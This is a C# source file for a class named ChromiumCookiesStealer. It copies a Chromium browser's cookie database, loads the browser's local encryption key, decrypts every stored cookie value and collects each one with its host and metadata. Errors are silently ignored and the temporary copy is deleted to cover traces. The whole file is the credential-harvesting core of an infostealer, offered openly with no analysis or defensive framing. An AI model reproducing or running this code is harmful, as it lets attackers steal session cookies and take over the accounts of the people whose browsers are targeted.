using System.IO;
using System.Collections.Generic;
using System;
using System.Linq;
using System.Security.Cryptography;
using Newtonsoft.Json;
using System.Data.SQLite;
using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using Org.BouncyCastle.Crypto.Engines;

public class ChromiumCookiesStealer
{
    public static List<CookieModel> GetCookies(string path, string keyPath)
    {
        if (!System.IO.File.Exists(path))
        {
            return new List<CookieModel>();
        }

        if (!System.IO.File.Exists(keyPath))
        {
            return new List<CookieModel>();
        }

        path = FileUtils.CopyFile(path);
        List<CookieModel> data = new List<CookieModel>();

        if (File.Exists(path))
        {
            try
            {
                using (var conn = new SQLiteConnection($"Data Source={path}"))
                using (var cmd = conn.CreateCommand())
                {
                    cmd.CommandText = $"SELECT name, encrypted_value, host_key, creation_utc, top_frame_site_key, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent, priority, samesite, source_scheme, source_port, is_same_party FROM cookies";
                    byte[] key = ChromiumDecryptor.GetKey(keyPath);
                    conn.Open();

                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            try
                            {
                                byte[] encryptedData = SQLUtils.GetBytes(reader, 1);
                                byte[] nonce, ciphertextTag;
                                ChromiumDecryptor.Prepare(encryptedData, out nonce, out ciphertextTag);
                                string value = ChromiumDecryptor.Decrypt(ciphertextTag, key, nonce);

                                data.Add(new CookieModel()
                                {
                                    Name = reader.GetString(0),
                                    Value = value,
                                    Host = reader.GetString(2),
                                    CreationUTC = reader.GetInt64(3),
                                    CorrectCreationUTC = GetCorrectUTC(reader.GetInt64(3)),
                                    TopFrameSiteKey = reader.GetString(4),
                                    Path = reader.GetString(5),
                                    ExpiresUTC = reader.GetInt64(6),
                                    CorrectExpiresUTC = GetCorrectUTC(reader.GetInt64(6)),
                                    IsSecure = reader.GetBoolean(7),
                                    IsHTTPOnly = reader.GetBoolean(8),
                                    LastAccessUTC = reader.GetInt64(9),
                                    CorrectLastAccessUTC = GetCorrectUTC(reader.GetInt64(9)),
                                    HasExpires = reader.GetBoolean(10),
                                    IsPersistent = reader.GetBoolean(11),
                                    Priority = reader.GetInt32(12),
                                    Samesite = reader.GetBoolean(13),
                                    SourceScheme = reader.GetInt32(14),
                                    SourcePort = reader.GetInt32(15),
                                    SameParty = reader.GetBoolean(16)
                                });
                            }
                            catch
                            {

                            }
                        }
                    }

                    conn.Close();
                    conn.Dispose();
                }
            }
            catch
            {

            }
        }

        System.IO.File.Delete(path);
        return data;
    }

    private static string GetCorrectUTC(long timestamp)
    {
        return Convert.ToString(TimeZoneInfo.ConvertTimeFromUtc(DateTime.FromFileTimeUtc(10 * timestamp), TimeZoneInfo.Local));
    }
}